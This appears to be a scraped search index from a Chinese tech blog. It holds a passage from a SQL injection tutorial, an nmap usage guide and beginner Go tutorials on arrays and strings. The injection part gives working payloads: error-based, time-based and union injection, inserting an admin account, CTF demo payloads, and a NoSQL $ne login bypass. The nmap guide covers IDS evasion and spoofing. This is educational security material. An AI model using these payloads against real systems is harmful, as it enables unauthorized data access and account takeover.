= mysqli_query($conn, \"SELECT title FROM ${_GET['table']}\"); 仍然可以利用别名的方式直接取出数据 select title from (select pwd AS title from wp_user)x 注意 在不知表名的情况下，可以先从 information_schema.tables 中查询表名。 在 select_expr 和 table_reference 的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。 12.1.3 注入点在 WHERE 或 HAVING 后 SQL 语句：$res = mysqli_query($conn, \"SELECT title FROM wp_news WHERE id=${_GET[id]}\") 实战中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在 HAVING 后的情况与之相似。 12.1.4 注入点在 GROUP BY 或 ORDER BY 后 12.1.4.1 利用报错 select * from wp_user_ order by 1|updatexml(1,concat(0x7e,database(),0x7e),0) 1105 - XPATH syntax error: ‘~sectest~’, Time: 0.000000s 12.1.4.2 利用延时 $res = mysqli_query($conn, \"SELECT title FROM wp_news GROUP BY ${_GET['title']}\"); 经过测试可以发现，?title=id desc,(if(1，sleep(1),1)) 会让页面迟 1 秒，于是可以利用时间注入获取相关数据。 注意 该方法只能用在 mysql 5 上，mysql 8 上失效 12.1.4.3 利用 \u0026 | ^ 位运算符进行 order by --布尔型盲注 select * from wp_user_ order by id|(if(1,2,1)) --id 和 if 返回的结果进行按位与进行 order by 根据时间判断 select * from wp_user_ order by 1|if(database() regexp \"sectest\",sleep(1),0) 12.1.4.4 利用括号闭合进行联合查询 前提是前句查询必须带有括号。 (select * from person order by 1) union (select 1,2,3) Demo https://chall.tasteless.eu/level1/index.php?dir=asc payload: ?dir=,3)union(select%201,flag%20from%20level1_flag)%23 12.1.5 注入点在 LIMIT 后 LIMIT 后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT 后只能是数字），在整个 SQL 语句没有 ORDER BY 关键字的情况下，可以直接使用 UNION 注入。 另外，可根据 SELECT 语法，通过加入 PROCEDURE 来尝试注入，这类语句只适合 MySQL 5.6 前的版本， select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1) 也可以进行时间盲注 procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1) 也可以直接写文件 into outfile ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"12.2 INSERT 注入 通常，注入位于字段名或者字段值的地方，且没有回显信息 12.2.1 注入点位于 table_name 如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下 SQL 语句： $res = mysqli_query($conn, \"INSERT INTO {$_GET['table']} VALUES(2,2,2,2)\"); 开发者预想的是，控制 table 的值为 wp_news，从而插入新闻表数据。由于可以控制表名，可以访问 ?table=wp_user values(2，'newadmin'，'newpass')%23，直接插入管理员。 12.2.2 注入点位于 VALUES 12.2.2.1 INSERT 延时 INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" and sleep(1)) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" \u0026 sleep(1)) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" | sleep(1)) 12.2.2.2 INSERT 报错 INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"or updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"and updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"\u0026updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"|updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"+updatexml(1,concat(0x7e,DATABASE()),0),1) result: 1105 - XPATH syntax error: ‘~sectest’, Time: 0.000000s Demo http://chall.tasteless.eu/level15/ payload insert into tables values ('\\',',(select flag from level15_flag))# ') name: \\ text: ,(select flag from level15_flag))# ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"12.3 UPDATE 注入 12.3.1 UPDATE 报错 update wp_user_ set password=\"zxczxcxzc\"or updatexml(1,concat(0x7e,database()),1) where id=9 update wp_user_ set password=\"zxczxcxzc\"or(updatexml(1,concat(0x7e,database()),1)) where id=9 13.3.2 UPDATE 延时 update wp_user_ set password=\"2\" and sleep(1) where id=9 update wp_user_ set password=\"00000000\" and if((LENGTH(database())=8),sleep(1),0) where id=9 --password处必须为数字型 ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"12.4 DELETE 注入 12.4.1 DELETE 延时 delete from wp_user_ where id=21 or/and(sleep(2)) delete from wp_user_ where id=21 and if((LENGTH(database()=7)),sleep(2),0) 13.4.2 DELETE 报错 delete from wp_user_ where id=21 and updatexml(1,concat(0x7e,database()),1) ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:4","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"13.5 DESCIBE 注入 {DESCRIBE | DESC} table_name [col_name | wild] DESCRIBE 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 SQL 通配符字符 %和 _ 的字符串。 源代码： \u003c?php require(\"config.php\"); $table = $_GET['table']?$_GET['table']:\"test\"; $table = Filter($table); mysqli_query($mysqli,\"desc `secret_{$table}`\") or Hacker(); $sql = \"select 'flag{xxx}' from secret_{$table}\"; $ret = sql_query($sql); echo $ret[0]; ?\u003e desc 可以接受两个参数，可以过掉第一个检测。 反引号在 union select 中可以当做空格。 payload: ?table=test`` union select database() limit 1 offset 1 ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:5","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"13、NoSQL 注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:13:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"13.1 定义 泛指非关系型的数据库。随着互联网 web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。 主要代表：MongDB、 Redis、 Memcache 以 MongDB 为例，它是一个面向文档存储的数据库，以键值对形式存在 { \"name\": \"xunruo\", \"age\": 26, \"status\": \"A\", \"groups\": [\"news\", \"sports\"] } ","date":"2023-03-30","objectID":"/post/9a9550e5/:13:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"13.2 注入原理一 注入过程 以用户身份验证为例，POST 请求： username=test\u0026password=123456 后端程序语言，我们希望是这样的： db.users.find({username: 'test', password: '123456'}) 因此，我们可以构造如下请求： username[$ne]=1\u0026password[$ne]=1 实际后端程序运行： db.logins.find({username:{$ne:1}, password:{$ne:1}}) 类比传统 SQL 语句： select * from logins where username \u003c\u003e 1 and password \u003c\u003e 1 ","date":"2023-03-30","objectID":"/post/9a9550e5/:13:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"13.3 注入原理二 如果在编程语言中不够谨慎，也可能产生像 sqli 注入那样的截断问题，但是这是在程序语言中而非 SQL 语句中： $script= \"try{ var key = db.users.find({username: 'test'}).value; var inputValue = '\".$input.\"'; if(key == inputValue) { return('match'); }}\"; 当输入 ';return key;// -\u003e var inputValue='';return key;//'，导致 inputValue 为空，直接返回 key 字段 参考文章： SQl注入相关知识 ","date":"2023-03-30","objectID":"/post/9a9550e5/:13:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["工具使用"],"content":"nmap使用基础 ","date":"2023-03-28","objectID":"/post/543fca94/:0:0","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"常见用法与参数 Nmap默认发送ARP的ping数据包，检测常用端口开放 nmap 192.168.244.160 快速扫描多个IP地址目标 nmap 192.168.244.160 192.168.244.1 简单扫描，并对返回的结果详细描述输出 nmap -vv 192.168.244.160 指定端口和范围扫描 Nmap默认扫描常用端口号，使用-p参数设定扫描的端口范围 nmap -p 端口范围 目标主机IP nmap -p 80-443 192.168.244.160 ","date":"2023-03-28","objectID":"/post/543fca94/:1:0","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"网段扫描格式 nmap -sP \u003cnetwork address \u003e \u003c/CIDR \u003e 10.1.1.0/8 = 10.1.1.1-10.255.255.255 # a段扫描 10.1.1.0/16 = 10.1.1.1-10.1.255.255 # b段扫描 10.1.1.0/24 = 10.1.1.1-10.1.1.255 # c段扫描 ","date":"2023-03-28","objectID":"/post/543fca94/:1:1","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"从文件中读取需要扫描的 IP 列表 nmap -iL ip-address.txt ","date":"2023-03-28","objectID":"/post/543fca94/:1:2","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"扫描除过某一个 ip 外的所有子网主机 nmap 192.168.244.1/24 -exclude 192.168.244.1 ","date":"2023-03-28","objectID":"/post/543fca94/:1:3","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"扫描除过某一个文件中的 ip 外的子网主机 nmap 192.168.244.1/24 -exclude robots.txt ","date":"2023-03-28","objectID":"/post/543fca94/:1:4","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"显示扫描的所有主机的列表 nmap -sL 192.168.244.1/24 ","date":"2023-03-28","objectID":"/post/543fca94/:1:5","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sP ping扫描：类似与windows/linux中ping扫描方式，常使用该命令去扫描一个内网范围来进行主机发现 nmap -sP 192.168.244.1-255/nmap -sP 192.168.244.1/24 ","date":"2023-03-28","objectID":"/post/543fca94/:1:6","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sS SYN 半开放扫描 nmap -sS 192.168.244.160 SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高 优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。 （防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高 缺点：需要root权限 ","date":"2023-03-28","objectID":"/post/543fca94/:1:7","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sT TCP 扫描 nmap -sT 192.168.244.160 等同于 192.168.244.160 Tcp connect() scan (sT)和上面的Tcp SYN 对应，TCP connect()扫描就是默认的扫描模式. 不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect(). 扫描技术只适用于找出 TCP 和 UDP 端口。 优点：不需要root权限 缺点：这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息， 由于它要完成3次握手，效率低，速度慢 ","date":"2023-03-28","objectID":"/post/543fca94/:1:8","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sU UDP 扫描 nmap -sU 192.168.244.160 这种扫描技术用来寻找目标主机打开的 UDP 端口，它不需要发送任何的 SYN 包，因为这种技术是针对 UDP 端口的。 UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的，如果 得到正确的适当的回应，说明端口是开放的。 缺点：扫描速度较慢 ","date":"2023-03-28","objectID":"/post/543fca94/:1:9","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sF FIN 标志的数据包扫描 namp -sF 192.168.224.160 有时候TcpSYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止 掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.和sS扫描效果差不多，比sT速度快 ","date":"2023-03-28","objectID":"/post/543fca94/:1:10","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-sV Version 版本检测扫描 nmap -sV 192.168.244.160 版本检测是用来扫描目标主机和端口上运行的软件的版本,使用版本检测扫描之前需要先用 TCP SYN 扫描开放了哪些端口 扫描速度较慢 ","date":"2023-03-28","objectID":"/post/543fca94/:1:11","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-O OS 操作系统类型的探测 nmap -O 192.168.244.160 远程检测操作系统和软件，Nmap 的 OS 检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的， 通过获取的信息你可以知道已知的漏洞。Nmap 有一个名为的 nmap-OS-DB 数据库，该数据库包含超过 2600 种 操作系统的信息。Nmap 把 TCP 和 UDP 数据包发送到目标机器上，然后检查结果和数据库对照。 ","date":"2023-03-28","objectID":"/post/543fca94/:1:12","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"–osscan-guess 猜测匹配操作系统 nmap -O --osscan-guess 192.168.244.160 通过 Nmap 准确的检测到远程操作系统是比较困难的，需要使用到 Nmap 的猜测功能选项，–osscan-guess 猜测认为最接近目标的匹配操作系统类型。 ","date":"2023-03-28","objectID":"/post/543fca94/:1:13","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-PN No ping 扫描 nmap -O -PN 192.168.244.160 如果远程主机有防火墙，IDS 和 IPS 系统，你可以使用 -PN 命令来确保不 ping 远程主机，因为有时候防火墙会组织掉 ping 请求。-PN 命令告诉 Nmap 不用 ping 远程主机。有时候使用 -PN 参数可以绕过 PING 命令，但是不影响主机的系统的发现。 ","date":"2023-03-28","objectID":"/post/543fca94/:1:14","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-T 设置时间模板 nmap -sS -T\u003c0-5\u003e 192.168.168.160 优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap 提供了一些简单的 方法，使用 6 个时间模板，使用时采用 - T 选项及数字 (0 - 5) 或名称。模板名称有 paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky 模式用于 IDS 躲避 Polite 模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal 为默认模式，因此 - T3 实际上是未做任何优化。 Aggressive 模式假设用户具有合适及可靠的网络从而加速扫描. nsane 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 ","date":"2023-03-28","objectID":"/post/543fca94/:1:15","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-traceroute 路由跟踪扫描：通过路由器追踪查处从我们电脑所在地到目标地之间所经常的网络节点，并可以看到通过各个节点所花费的时间。 nmap -traceroute www.baidu.com ","date":"2023-03-28","objectID":"/post/543fca94/:1:16","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"-A 综合扫描：包括系统探测，版本探测，脚本扫描，路由跟踪，速度很慢 nmap -A 192.168.244.160 多参数混合 nmap -vv -p 1-100,3306,3389 -O -traceroute 192.168.244.160 Nmap输出格式 nmap -O -PN 192.168.244.160 -oN 1.txt #标准输出 nmap -O -PN 192.168.244.160 -oX 1.xml #xml格式输出 nmap -O -PN 192.168.244.160 -oG 2.txt #grep格式输出 Nmap脚本使用 nmap --script 类别 Nmap脚本分类 - auth: 负责处理鉴权证书（绕开鉴权）的脚本 - broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式，针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 - discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源，例如进行whois解析 - fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 - intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 - malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反，属于安全性脚本 - version: 负责增强服务与版本扫描（Version Detection）功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 使用具体脚本进行扫描 nmap --script 具体的脚本 www.baidu.com 常用脚本案例： 1、扫描服务器常见漏洞 nmap --script vuln \u003ctarget\u003e 2、检查FTP是否开启匿名登录 nmap --script ftp-anon \u003ctarget\u003e PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 1170 924 31 Mar 28 2001 .banner | d--x--x--x 2 root root 1024 Jan 14 2002 bin | d--x--x--x 2 root root 1024 Aug 10 1999 etc | drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable] | d--x--x--x 2 root root 1024 Jan 14 2002 lib | drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub |_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all. 3、对mysql进行暴力破解 ","date":"2023-03-28","objectID":"/post/543fca94/:1:17","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"参数速查 Nmap 支持主机名，网段的表示方式 例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 VERILOG-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段 -iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描 --exclude host1[, host2] 从扫描任务中需要排除的主机 --exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 ","date":"2023-03-28","objectID":"/post/543fca94/:2:0","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"主机发现 VERILOG-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描 -sn ping扫描,即主机发现 -Pn 不检测主机存活 -PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现 -PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机 -PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 ","date":"2023-03-28","objectID":"/post/543fca94/:2:1","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"扫描技巧 VERILOG-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描 -sU UDP扫描 -sN/sF/sX TCP Null，FIN，and Xmas扫描 --scanflags 自定义TCP包中的flags -sI zombie host[:probeport] Idlescan -sY/sZ SCTP INIT/COOKIE-ECHO 扫描 -sO 使用IP protocol 扫描确定目标机支持的协议类型 -b “FTP relay host” 使用FTP bounce scan ","date":"2023-03-28","objectID":"/post/543fca94/:2:2","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"指定端口和扫描顺序 VERILOG-p 特定的端口 -p80,443 或者 -p1-65535 -p U:PORT 扫描udp的某个端口, -p U:53 -F 快速扫描模式,比默认的扫描端口还少 -r 不随机扫描端口,默认是随机扫描的 --top-ports \"number\" 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个 --port-ratio \"ratio\" 扫描指定频率以上的端口 ","date":"2023-03-28","objectID":"/post/543fca94/:2:3","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"服务版本识别 VERILOG-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 --version-intensity \"level\" 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7 --version-light 打开轻量级模式,为--version-intensity 2的别名 --version-all 尝试所有探测,为--version-intensity 9的别名 --version-trace 显示出详细的版本侦测过程信息 ","date":"2023-03-28","objectID":"/post/543fca94/:2:4","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"脚本扫描 VERILOG-sC 根据端口识别的服务,调用默认脚本 --script=”Lua scripts” 调用的脚本名 --script-args=n1=v1,[n2=v2] 调用的脚本传递的参数 --script-args-file=filename 使用文本传递参数 --script-trace 显示所有发送和接收到的数据 --script-updatedb 更新脚本的数据库 --script-help=”Lua script” 显示指定脚本的帮助 ","date":"2023-03-28","objectID":"/post/543fca94/:2:5","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"OS 识别 VERILOG-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测 --osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口) --osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 ","date":"2023-03-28","objectID":"/post/543fca94/:2:6","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"防火墙 / IDS 躲避和哄骗 VERILOG-f; --mtu value 指定使用分片、指定数据包的MTU. -D decoy1,decoy2,ME 使用诱饵隐蔽扫描 -S IP-ADDRESS 源地址欺骗 -e interface 使用指定的接口 -g/ --source-port PROTNUM 使用指定源端口 --proxies url1,[url2],... 使用HTTP或者SOCKS4的代理 --data-length NUM 填充随机数据让数据包长度达到NUM --ip-options OPTIONS 使用指定的IP选项来发送数据包 --ttl VALUE 设置IP time-to-live域 --spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装 --badsum 使用错误的checksum来发送数据包 ","date":"2023-03-28","objectID":"/post/543fca94/:2:7","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"Nmap 输出 VERILOG-oN 将标准输出直接写入指定的文件 -oX 输出xml文件 -oS 将所有的输出都改为大写 -oG 输出便于通过bash或者perl处理的格式,非xml -oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出 -v 提高输出信息的详细度 -d level 设置debug级别,最高是9 --reason 显示端口处于带确认状态的原因 --open 只输出端口状态为open的端口 --packet-trace 显示所有发送或者接收到的数据包 --iflist 显示路由信息和接口,便于调试 --log-errors 把日志等级为errors/warings的日志输出 --append-output 追加到指定的文件 --resume FILENAME 恢复已停止的扫描 --stylesheet PATH/URL 设置XSL样式表，转换XML输出 --webxml 从namp.org得到XML的样式 --no-sytlesheet 忽略XML声明的XSL样式表 ","date":"2023-03-28","objectID":"/post/543fca94/:2:8","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"其他 Nmap 选项 VERILOG-6 开启IPv6 -A OS识别,版本探测,脚本扫描和traceroute --datedir DIRNAME 说明用户Nmap数据文件位置 --send-eth / --send-ip 使用原以太网帧发送/在原IP层发送 --privileged 假定用户具有全部权限 --unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限 -V 打印版本信息 -h 输出帮助 ","date":"2023-03-28","objectID":"/post/543fca94/:2:9","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["工具使用"],"content":"常见端口对应服务 服务 端口 说明 FTP 20 FTP服务器真正传输所用的端口，用于上传、下载 FTP 21 用于FTP的登陆认证 SSH、SFTP 22 加密的远程登录，文件传输 Telnet 23 远程登录（在本地主机上使用此端口与远程服务器的22/3389端口连接） SMTP 25 用于发送邮件 HTTP 80 用于网页浏览 POP3 110 SUN公司的RPC服务所有端口 Network News Transfer Protocol 119 NEWS新闻组传输协议，承载USENET通信 SMTP 161 Simple Network Management Protocol，简单网络管理协议 SNMP Trap 162 SNMP陷阱 HTTPS 443 加密的网页浏览端口 CIFS 445 公共Internet文件系统 sql server 1433 Microsoft的SQL服务开放的端口 数据库 Oracle 1521 数据库 NFS 2049 通过网络，让不同的机器、不同的操作系统实现文件共享 MySQL 3306 数据库 WIN2003远程登录 3389 Windows 2000(2003) Server远程桌面的服务端口，本地服务器开放此端口，去连接到远程的服务器 QQ 4000 腾讯QQ客户端开放此端口 WebLogic 7001 一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器 Wingate 8010 Wingate代理开放此端口 TOMCAT 8080 WWW代理开放此端口 参考文章： Nmap 不老的神器 ","date":"2023-03-28","objectID":"/post/543fca94/:3:0","tags":["nmap"],"title":"Nmap-使用基础","uri":"/post/543fca94/"},{"categories":["Golang"],"content":"Go5：数组与多维数组 ","date":"2023-03-21","objectID":"/post/5ded7b78/:0:0","tags":["Golang","编程"],"title":"Go入门日记-数组","uri":"/post/5ded7b78/"},{"categories":["Golang"],"content":"一 、数组 1.1 数组的声明 数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型 var arr1 [6]int //定义长度为6的整型数组，未初始化默认为0 //输出 [0 0 0 0 0 0] var arr2 = [...]int{1,2,3,4,5} //自动推导长度并初始化 //输出 [1 2 3 4 5] arr3 := [6]int{1,2,3,4,5,6} //定义并初始化 //输出 [1 2 3 4 5 6] arr3 := [...]int{2,3,4} //自动推导长度并初始化 //输出 [2 3 4] arr4 := [6]int{1,2} //指定固定长度，前几位被初始化，其他使用零值 // [1 2 0 0 0 0] arr5 := [6]int{1:9, 5:18} //将索引为 1 和 5 的元素初始化 //输出 [0 9 0 0 0 18] 1.2 数组常见操作 arr := [6]int{1,2,3,4,5,6} //输出所有元素 fmt.Println(arr) fmt.Println(arr[:]) //输出 [1 2 3 4 5 6] //输出前五个元素 fmt.Println(arr[:5]) //输出 [1 2 3 4 5] //输出从第5个开始（不包含第5个） fmt.Println(arr[5:]) //输出 [6] //数组的长度 fmt.Println(len(arr)) //输出 6 1.3 数组的遍历 arr := [3]int{1,2,3} for i := 0; i \u003c len(arr); i++ { fmt.Println(arr[i]) } //输出 1 2 3 arr := [3]int{1,2,3} for key, value := range arr { fmt.Println(key, value) } //输出 0 1 1 2 2 3 1.4 多维数组 //创建多维数组 var arr[2][2]int arr1 := [][]int{} //多维数组仅第一维度允许使用\"...\" arr2 := [...][2]int{ {1,2}, {3,4}, } 1.5 数组使用注意事项 数组创建完长度就固定，不可以再追加元素； 长度是数组类型的一部分，因此[3]int与[4]int是不同的类型； 数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该函数的副本，而不是他的指针。 ","date":"2023-03-21","objectID":"/post/5ded7b78/:0:1","tags":["Golang","编程"],"title":"Go入门日记-数组","uri":"/post/5ded7b78/"},{"categories":["Golang"],"content":"Go4：字符与字符串 ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:0","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"一、字符 //在golang中没有专门的字符类型变量 var c1 byte = 'a' fmt.Println(\"c1=\", c1) //字符对应码大于255的字符可以使用int来保存 var c2 int = '成' fmt.Printf(\"c2=%c\\n\", c2) ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:1","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"二、字符串 Tips：Go与传统的字符串不同，Go字符串是一串固定长度的字符连接起来的字符序列，字符串在内容初始化后不能被修改，都是采用UTF-8字符集编码。 var str1 string str1 = \"hello\" str2 := \"beijing\" //字符串不可直接改变 //str1[0]='c'会报错 fmt.Printf(\"%c\\n\", str1[1]) //输出 e fmt.Println(len(str2)) //输出 7 fmt.Println(str1 + str2) //输出 hellobeijing 修改字符串的间接方式： 1、通过两次转换来修改字符串 str := \"successful\" //转换成byte数组类型 strTemp := []byte(str) fmt.Println(\"strTemp=\", strTemp) //输出 //strTemp= [115 117 99 99 101 115 115 102 117 108] //修改数组的的值 strTemp[0] = 'c' //将数组转换成字符串 strResult := string(strTemp) fmt.Println(\"strResult=\", strResult) 2、使用切片来完成 str3 := \"liu\" str3 = \"c\" + str3[1:] fmt.Println(str3) //输出：ciu ","date":"2023-03-15","objectID":"/post/ad0f0f0b/:0:2","tags":["Golang","编程"],"title":"Go入门日记-字符串","uri":"/post/ad0f0f0b/"},{"categories":["Golang"],"content":"三、字符串操作 3.1 len()、string()函数 str4 := \"hello\" str5 := \"北京\" //在go语言中中文以utf-8格式保存，每个中文占据三个字节 fmt.Println(len(str4)) //输出 5 fmt.Println(len(str5)) //输出 6 //使用特定函数可以输出真正的字符串长度 fmt.Println(utf8.RuneCountInString(str5)) //输出 2 使用len()遍历字符串 str := \"你好\" for i,ch := range str { fmt.Println(i,ch) } //输出 0 20320 3 22909 string()函数 num := 108 fmt.Printf(\"%T \\n\", string(num)) //输出 string fmt.Printf(\"%s \\n\", string(num)) //输出 l 3.2 字符串连接 str1 = \"hello\" str2 